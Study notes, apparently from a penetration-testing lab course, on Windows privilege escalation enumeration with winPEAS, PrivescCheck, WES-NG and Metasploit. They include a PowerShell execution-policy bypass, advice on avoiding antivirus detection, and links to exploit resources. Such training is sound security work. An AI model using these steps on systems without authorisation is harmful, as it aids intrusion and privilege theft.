WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:

Command Prompt

```shell-session
C:\> winpeas.exe > outputfile.txt
```

WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).  

##### PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck).

**Reminder**: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the `Set-ExecutionPolicy` cmdlet as shown below.

Powershell

```shell-session
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

##### WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng).

Once installed, and before using it, type the `wes.py --update` command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;

KaliLinux

```shell-session
user@kali$ wes.py systeminfo.txt
```

##### Metasploit

If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

some more way to Privilege Escalate 
	- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
	- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
	- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
	- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
	- [Decoder's Blog](https://decoder.cloud/)
	- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
	- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)